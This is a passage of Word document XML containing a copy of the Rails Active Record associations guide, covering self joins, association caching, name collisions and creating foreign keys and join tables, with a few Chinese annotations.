                      <a:noFill/>
                      <a:miter lim="800000"/>
                      <a:headEnd/>
                      <a:tailEnd/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="56DE41DC" w14:textId="1EC6BCC1" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>2.10 Self Joins</w:t>
      </w:r>
      <w:r w:rsidR="00320176">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
        </w:rPr>
        <w:t xml:space="preserve"> 自关联</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27916C11" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>In designing a data model, you will sometimes find a model that should have a relation to itself. For example, you may want to store all employees in a single database model, but be able to trace relationships such as between manager and subordinates. This situation can be modeled with self-joining associations:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="536943BA" w14:textId="77777777" w:rsidTr="00674E36">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="10EB852C" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Employee &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="366096EB" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t xml:space="preserve">  has_many :subordinates, </w:t>
            </w:r>
            <w:r w:rsidRPr="00435200">
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>:class_name</w:t>
            </w:r>
            <w:r w:rsidRPr="00435200">
              <w:rPr>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00435200">
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>=&gt; "Employee"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="04E1E79E" w14:textId="2849BB71" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t xml:space="preserve">  belongs_to :manager, </w:t>
            </w:r>
            <w:r w:rsidRPr="00435200">
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>:class_name</w:t>
            </w:r>
            <w:r w:rsidRPr="00435200">
              <w:rPr>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="00435200">
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>=&gt; "Employee</w:t>
            </w:r>
            <w:r w:rsidRPr="00435200">
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>",</w:t>
            </w:r>
            <w:r w:rsidR="00435200">
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
                <w:rFonts w:hint="eastAsia"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>:foreign_key</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; "manager_id"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="697F4AE6" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="08581F2D" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">With this setup, you can retrieve </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>@employee.subordinates</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>@employee.manager</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37B0A457" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>3 Tips, Tricks, and Warnings</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E9D70C7" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Here are a few things you should know to make efficient use of Active Record associations in your Rails applications:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48FC4D98" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="43"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>Controlling caching</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1239AF1E" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="43"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>Avoiding name collisions</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49FFBEC8" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="43"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>Updating the schema</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7346D0ED" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="43"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>Controlling association scope</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7EC9FEDE" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="43"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>Bi-directional associations</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="264384B5" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>3.1 Controlling Caching</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0746E98D" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>All of the association methods are built around caching, which keeps the result of the most recent query available for further operations. The cache is even shared across methods. For example:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="73E701DD" w14:textId="77777777" w:rsidTr="00674E36">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="467A78E0" w14:textId="7680F90D" w:rsidR="002A2B82" w:rsidRDefault="00435200" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>customer.orders             </w:t>
            </w:r>
            <w:r w:rsidR="002A2B82">
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># retrieves orders from the database</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="637BFB1F" w14:textId="2D7B30B2" w:rsidR="002A2B82" w:rsidRDefault="00435200" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t xml:space="preserve">customer.orders.size           </w:t>
            </w:r>
            <w:r w:rsidR="002A2B82">
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># uses the cached copy of orders</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="265DB49F" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>customer.orders.empty?          # uses the cached copy of orders</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="003F6DC8" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">But what if you want to reload the cache, because data might have been changed by some other part of the application? Just pass </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>true</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to the association call:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8522"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="567CAADB" w14:textId="77777777" w:rsidTr="00674E36">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1C6333C0" w14:textId="4B6B5B66" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>customer.orders          # retrieves orders from the database</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="24C51908" w14:textId="2F6BA447" w:rsidR="002A2B82" w:rsidRDefault="00074E0C" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t xml:space="preserve">customer.orders.size        </w:t>
            </w:r>
            <w:r w:rsidR="002A2B82">
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># uses the cached copy of orders</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="385E0653" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>customer.orders(true).empty?    # discards the cached copy of orders</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0A255D65" w14:textId="709E4825" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="00074E0C">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>                  # and goes back to the database</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="07B3721F" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>3.2 Avoiding Name Collisions</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A2DCB95" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">You are not free to use just any name for your associations. Because creating an association adds a method with that name to the model, it is a bad idea to give an association a name that is already used for an instance method of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActiveRecord::Base</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. The association method would override the base method and break things. For instance, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>attributes</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>connection</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> are bad names for associations.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="19E7CF13" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>3.3 Updating the Schema</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CFFCB5D" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Associations are extremely useful, but they are not magic. You are responsible for maintaining your database schema to match your associations. In practice, this means two things, depending on what sort of associations you are creating. For </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>belongs_to</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> associations you need to create foreign keys, and for </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_and_belongs_to_many</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> associations you need to create the appropriate join table.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C29A938" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">3.3.1 Creating Foreign Keys for </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>belongs_to</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Associations</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="554D9BB0" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">When you declare a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>belongs_to</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> association, you need to create foreign keys as appropriate. For example, consider this model:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3984"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="4FEA502B" w14:textId="77777777" w:rsidTr="00674E36">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1D5AA0AE" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Order &lt; ActiveRecord::Base</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="38D302B6" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  belongs_to :customer</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="121BCF3F" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6B1268DF" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>This declaration needs to be backed up by the proper foreign key declaration on the orders table:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5424"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="25B6350A" w14:textId="77777777" w:rsidTr="00674E36">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="3C4E1864" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>class</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>CreateOrders &lt; ActiveRecord::Migration</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1B0A8507" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>change</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7D9E2911" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    create_table :orders</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>do</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>|t|</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="379A74FA" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      t.datetime :order_date</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3B8661C7" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      t.string   :order_number</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2D61E9A8" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>      t.integer  :customer_id</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="204DAE1F" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5F1D97CD" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0D558AB0" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5A1D95D3" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If you create an association some time after you build the underlying model, you need to remember to create an </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>add_column</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> migration to provide the necessary foreign key.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C09ADA6" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">3.3.2 Creating </w:t>
      </w:r>
      <w:r w:rsidRPr="00897D8D">
        <w:rPr>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>Join Tables</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> for </w:t>
      </w:r>
      <w:r w:rsidRPr="00897D8D">
        <w:rPr>
          <w:rStyle w:val="HTML"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>has_and_belongs_to_many</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Associations</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A5785A8" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">If you create a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_and_belongs_to_many</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> association, you need to explicitly create the joining table. Unless the name of the join table is explicitly specified by using the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:join_table</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option, Active Record creates the name by using the lexical order of the class names. So a join between customer and order models will give the default join table name of “customers_orders” because “c” outranks “o” in lexical ordering.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AAF5B64" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The precedence between model names is calculated using the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>&lt;</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> operator for </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>String</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. This means that if the strings are of different lengths, and the strings are equal when compared up to the shortest length, then the longer string is considered of higher lexical precedence than the shorter one. For example, one would expect the tables “paper_boxes” and “papers” to generate a join table name of “papers_paper_boxes” because of the length of the name “paper_boxes”, but it in fact generates a join table name of “paper_boxes_papers” (because the underscore ‘_’ is lexicographically </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>less</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> than ‘s’ in common encodings).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6451F19A" w14:textId="77777777" w:rsidR="002A2B82" w:rsidRDefault="002A2B82" w:rsidP="002A2B82">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Whatever the name, you must manually generate the join table with an appropriate migration. For example, consider these associations:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="af"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4896"/>
      </w:tblGrid>
      <w:tr w:rsidR="002A2B82" w14:paraId="4C1845E9" w14:textId="77777777" w:rsidTr="00674E36">
        <w:tc>
